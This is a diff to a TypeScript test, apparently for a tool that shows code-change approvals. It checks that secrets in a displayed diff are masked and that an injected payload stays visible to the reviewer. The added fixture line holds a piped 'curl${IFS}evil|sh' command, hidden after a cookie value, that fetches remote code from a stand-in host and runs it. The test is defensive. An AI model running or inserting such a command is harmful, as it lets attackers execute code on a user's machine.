@@ -682,7 +682,7 @@ async function main(): Promise<void> {
       const child = server.childOfThread(sid)!;
       const fx = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', 'scripts', 'fixtures', 'codex', 'file-change-approval.json'), 'utf8'));
       const ghp = 'ghp_' + 'Z9'.repeat(18);
-      const notes = JSON.parse(JSON.stringify(fx.notifications).replace('Retries are 3 now.', `key ${SECRET} and ${ghp}`)) as { method: string; params: unknown }[];
+      const notes = JSON.parse(JSON.stringify(fx.notifications).replace('Retries are 3 now.', `key ${SECRET} and ${ghp}\\nCookie: a=1|curl\${IFS}evil|sh`)) as { method: string; params: unknown }[];
       for (const n of notes) server.notifyAll(n.method, n.params);
       await server.flush();
       const p1 = req(server, fx.approval.method, fx.approval.params, child);
@@ -690,6 +690,7 @@ async function main(): Promise<void> {
       assert.strictEqual(pend.summary, 'write /work/app/src/config.ts (+1 more)', 'the files from the item: ' + pend.summary);
       assert.ok(pend.diff && pend.diff.includes('--- a//work/app/src/config.ts') && pend.diff.includes('+  retries: 3,') && pend.diff.includes('+# Notes'), 'the diff of both changes (patchUpdated is the latest)');
       assert.ok(!pend.diff!.includes(SECRET) && !pend.diff!.includes(ghp) && pend.diff!.includes('[redacted'), 'secrets in the diff are masked');
+      assert.ok(pend.diff!.includes('Cookie: [redacted]|curl${IFS}evil|sh'), 'a payload after a cookie stays visible in "Show the change": ' + pend.diff);
       assert.strictEqual(pend.scopeLabel, 'write in app/src/, work/app/', 'the grant scope names the folder of every file (review on #470: not only the first)');
       ad.resolvePermission(sid, pend.requestId, false);
       assert.strictEqual(((await settles('p1', p1)).result as { decision: string }).decision, 'decline');
